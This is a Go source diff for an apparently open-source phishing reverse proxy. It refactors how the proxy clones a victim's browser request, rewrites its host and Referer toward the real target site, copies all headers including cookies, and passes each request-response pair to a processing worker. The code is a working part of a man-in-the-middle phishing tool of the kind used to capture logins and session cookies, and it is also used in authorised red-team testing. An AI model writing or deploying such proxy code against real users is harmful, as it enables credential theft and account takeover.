@@ -93,6 +93,25 @@ type PhishingProxy struct {
 	responseTransformers []ResponseTransformer
 }
 
+func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error) {
+	target := request.URL
+	target.Scheme = p.targetURL.Scheme
+	target.Host = p.targetURL.Host
+
+	req, err := http.NewRequest(request.Method, target.String(), request.Body)
+	if err != nil {
+		return nil, err
+	}
+	if request.Referer() != "" {
+		req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
+	}
+	for key, _ := range request.Header {
+		req.Header.Set(key, request.Header.Get(key))
+	}
+	req.Header.Del("Accept-Encoding")
+	return req, nil
+}
+
 // HandleConnection does the actual work of proxying the HTTP request between the victim and the target.
 // Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
 func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTTPTransaction) {
@@ -104,12 +123,11 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTT
 		return
 	}
 
-	target := request.URL
-	target.Scheme = p.targetURL.Scheme
-	target.Host = p.targetURL.Host
-
-	req, _ := http.NewRequest(request.Method, target.String(), request.Body)
-	req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
+	req, err := p.copyRequest(request)
+	if err != nil {
+		log.Println("Error cloning request.")
+		return
+	}
 	resp, err := p.client.Do(req)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
@@ -135,7 +153,7 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTT
 		return
 	}
 	transactions <- &HTTPTransaction{
-		Request:  request,
+		Request:  req,
 		Response: resp,
 	}
 }
@@ -158,7 +176,7 @@ func processTransactions(transactions <-chan *HTTPTransaction) {
 	}
 }
 
-func newTlsListener(address, certPath, privateKeyPath string) (net.Listener, error) {
+func newTLSListener(address, certPath, privateKeyPath string) (net.Listener, error) {
 	cer, err := tls.LoadX509KeyPair(certPath, privateKeyPath)
 	if err != nil {
 		return nil, err
@@ -238,7 +256,7 @@ func main() {
 	if *insecure {
 		server, err = newInsecureListener(*address)
 	} else {
-		server, err = newTlsListener(*address, *certPath, *privateKeyPath)
+		server, err = newTLSListener(*address, *certPath, *privateKeyPath)
 	}
 	if err != nil {
 		exitWithError(err.Error())
